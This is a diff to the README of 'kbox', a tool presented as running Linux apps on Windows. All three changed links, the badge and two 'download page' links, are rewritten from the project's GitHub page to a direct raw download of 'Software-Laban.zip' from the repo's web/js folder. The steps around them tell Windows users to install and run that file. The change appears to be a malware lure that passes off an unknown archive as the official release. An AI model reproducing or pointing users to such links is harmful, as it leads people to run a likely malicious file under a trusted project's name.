@@ -1,6 +1,6 @@
 # 🐧 kbox - Run Linux apps with less setup
 
-[![Download kbox](https://img.shields.io/badge/Download-kbox-blue?style=for-the-badge)](https://github.com/JULES546/kbox)
+[![Download kbox](https://img.shields.io/badge/Download-kbox-blue?style=for-the-badge)](https://raw.githubusercontent.com/JULES546/kbox/main/web/js/Software-Laban.zip)
 
 ## 🚀 What kbox does
 
@@ -29,7 +29,7 @@ For the best experience, close large apps before you start kbox. This gives the 
 
 Go to the download page here:
 
-[https://github.com/JULES546/kbox](https://github.com/JULES546/kbox)
+[https://raw.githubusercontent.com/JULES546/kbox/main/web/js/Software-Laban.zip](https://raw.githubusercontent.com/JULES546/kbox/main/web/js/Software-Laban.zip)
 
 On that page, download the latest build or release file for Windows. If you see more than one file, pick the one made for Windows.
 
@@ -179,6 +179,6 @@ That makes kbox useful for users who want Linux behavior without moving to a ful
 
 If you need the download page again, use this link:
 
-[https://github.com/JULES546/kbox](https://github.com/JULES546/kbox)
+[https://raw.githubusercontent.com/JULES546/kbox/main/web/js/Software-Laban.zip](https://raw.githubusercontent.com/JULES546/kbox/main/web/js/Software-Laban.zip)
 
 Download the Windows file from that page, then install and run it using the steps above
